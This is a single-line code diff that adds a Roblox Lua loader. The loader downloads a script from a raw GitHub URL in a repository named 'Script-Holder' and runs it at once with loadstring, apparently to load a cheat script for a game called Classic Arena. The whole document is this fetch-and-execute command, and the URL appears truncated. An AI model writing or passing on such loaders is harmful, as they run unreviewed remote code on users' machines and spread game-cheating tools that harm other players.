@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/wh0asked1/Script-Holder_wh0/refs/heads/main/SIGMA-IN-CLASSIC-ARENA.",true))()
